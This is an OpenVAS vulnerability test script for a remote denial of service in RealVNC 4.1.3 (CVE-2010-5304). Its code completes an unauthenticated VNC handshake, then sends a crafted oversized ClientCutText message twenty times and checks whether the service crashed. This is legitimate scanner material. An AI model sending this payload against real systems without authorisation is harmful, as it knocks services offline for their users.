###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_RealVNC_39895.nasl 13210 2019-01-22 09:14:04Z cfischer $
#
# RealVNC 4.1.3 'ClientCutText' Message Remote Denial of Service Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100622");
  script_version("$Revision: 13210 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-22 10:14:04 +0100 (Tue, 22 Jan 2019) $");
  script_tag(name:"creation_date", value:"2010-05-04 19:30:07 +0200 (Tue, 04 May 2010)");
  script_bugtraq_id(39895);
  script_cve_id("CVE-2010-5304");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("RealVNC 4.1.3 'ClientCutText' Message Remote Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39895");
  script_xref(name:"URL", value:"http://www.realvnc.com");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("vnc.nasl");
  script_require_ports("Services/vnc", 5900, 5901, 5902);
  script_mandatory_keys("vnc/detected");

  script_tag(name:"summary", value:"RealVNC Viewer is prone to a remote denial-of-service vulnerability.");

  script_tag(name:"impact", value:"An attacker can exploit this issue to crash the affected application,
  denying service to legitimate users.");

  script_tag(name:"affected", value:"RealVNC 4.1.3 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

port = get_kb_item("Services/vnc");
if(!port) port = 5900;
if(!get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if(!soc)exit(0);

buf = recv(socket:soc, length:8192);
if(isnull(buf) || "RFB" >!< buf) {
  close(soc);
  exit(0);
}

send(socket:soc, data:buf);
buf = recv(socket:soc, length:8192);

if(isnull(buf)) {
  close(soc);
  exit(0);
}

send(socket:soc, data:raw_string(0x01));
buf = recv(socket:soc, length:8192);

if(strlen(buf) == 4 &&
   ord(buf[0]) == 0 &&
   ord(buf[1]) == 0 &&
   ord(buf[2]) == 0 &&
   ord(buf[3]) == 0) { # SecurityResult OK. The server must be set to No Authentication for this to work

  send(socket:soc, data:raw_string(0x01));
  txt = crap(data:raw_string(0xAA),length:4000);
  exploit = raw_string(0x06,0x00,0x00,0x00) + txt;

  for(i=0;i<20;i++) {
    send(socket:soc, data:exploit);
  }

  if(soc)
    close(soc);

  soc1 = open_sock_tcp(port);
  if(!soc1) {
    security_message(port:port);
    exit(0);
  }

  buf = recv(socket:soc1, length:8192);
  if(buf == NULL) {
    security_message(port:port);
    exit(0);
  } else {
    close(soc1);
  }
} else {
  close(soc);
  exit(0);
}

exit(0);